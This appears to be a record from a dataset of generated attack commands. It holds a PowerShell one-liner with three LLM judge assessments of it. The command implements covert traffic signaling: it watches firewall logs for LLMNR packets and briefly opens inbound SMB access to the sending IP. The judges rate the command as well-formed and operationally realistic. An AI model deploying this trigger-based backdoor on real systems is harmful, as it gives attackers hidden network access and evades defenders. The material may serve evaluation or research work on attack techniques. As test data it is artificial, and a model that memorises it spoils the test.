command: Invoke-Command -ComputerName localhost -ScriptBlock { $log = "$env:SystemRoot\System32\LogFiles\Firewall\pfirewall.log"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match '\b(ALLOW|DROP)\s+UDP\s+(\d{1,3}(?:\.\d{1,3}){3})\s+\d{1,3}(?:\.\d{1,3}){3}\s+\d+\s+5355\b') { $src=$matches[2]; $name="llmnr-smb-$($src.Replace('.','-'))"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }
explanation: Monitors for LLMNR queries (UDP/5355) as a network signal to grant temporary SMB (445) access only to the querying IP.
rationale_steps: Use the LLMNR sender’s IP as a signal to open TCP/445 inbound
Tear down the rule after a short window

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced braces/quotes, valid cmdlets/parameters, proper pipelines, and a valid regex string.
llm_judgments.semantic_justification: It correctly implements traffic signaling by tailing firewall logs for LLMNR and creating a temporary SMB allow rule for the source IP, but it requires administrative rights and a functional Invoke-Command (WinRM/local remoting), conflicting with the stated 'Privilege: None' and reducing operational plausibility.

llm_judgments.syntactic_justification: The command is largely well-formed with balanced braces, valid PowerShell cmdlets, and proper piping, though the double-escaped backslashes (\\) and regex patterns (\b, \d, etc.) suggest the command was serialized through an extra escaping layer that may cause regex matching issues at runtime.
llm_judgments.semantic_justification: The command precisely implements T1205 Traffic Signaling by monitoring Windows Firewall logs for UDP/5355 (LLMNR) packets as a covert trigger signal, then dynamically creating temporary inbound firewall rules to allow SMB (TCP/445) access from the signaling source IP for 300 seconds before auto-removal, which is a realistic and operationally coherent port-knocking/traffic-signaling C2 mechanism.

llm_judgments.syntactic_justification: The command is perfectly well-formed, using correct PowerShell syntax, balanced braces, valid regex patterns, and proper cmdlet pipelines.
llm_judgments.semantic_justification: The logic perfectly implements the T1205 technique by monitoring logs for a specific signal (LLMNR) to trigger a firewall change; however, it requires local Administrator privileges which contradicts the 'None' privilege level provided in the prompt.
